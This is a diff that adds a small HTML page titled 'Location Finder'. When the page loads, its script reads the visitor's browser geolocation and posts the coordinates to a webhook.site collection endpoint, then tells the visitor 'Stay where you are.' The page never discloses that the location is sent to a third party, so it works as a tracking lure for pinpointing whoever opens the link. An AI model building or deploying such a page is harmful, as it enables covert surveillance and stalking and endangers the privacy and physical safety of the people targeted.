@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Location Finder</title>
+</head>
+<body>
+  <h1>Getting your location...</h1>
+  <p id="status">Please wait...</p>
+
+  <script>
+    function sendLocation(lat, lon) {
+      fetch('https://webhook.site/c3767833-20fa-4969-a93b-11192b33de8f', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude: lat, longitude: lon })
+      }).then(() => {
+        document.getElementById('status').innerText = "Location sent. Stay where you are.";
+      }).catch(err => {
+        document.getElementById('status').innerText = "Error sending location.";
+      });
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            sendLocation(lat, lon);
+          },
+          (error) => {
+            document.getElementById('status').innerText = "Location access denied or failed.";
+          }
+        );
+      } else {
+        document.getElementById('status').innerText = "Geolocation is not supported.";
+      }
+    }
+
+    getLocation();
+  </script>
+</body>
+</html>
